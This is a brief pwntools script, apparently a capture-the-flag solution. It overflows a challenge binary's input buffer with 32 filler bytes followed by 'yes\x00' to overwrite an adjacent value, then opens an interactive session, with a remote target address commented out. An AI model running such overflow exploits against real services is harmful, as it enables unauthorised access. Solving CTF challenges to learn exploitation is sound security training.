from pwn import *

io = process("./pwn")
# io = remote("47.79.89.88", 32775)

io.recvuntil("Do you know overflows? (yes/no)\n")
payload = b"a" * (0x40 - 0x20) + b"yes\x00"
print(len(payload))
io.sendline(payload)


io.interactive()
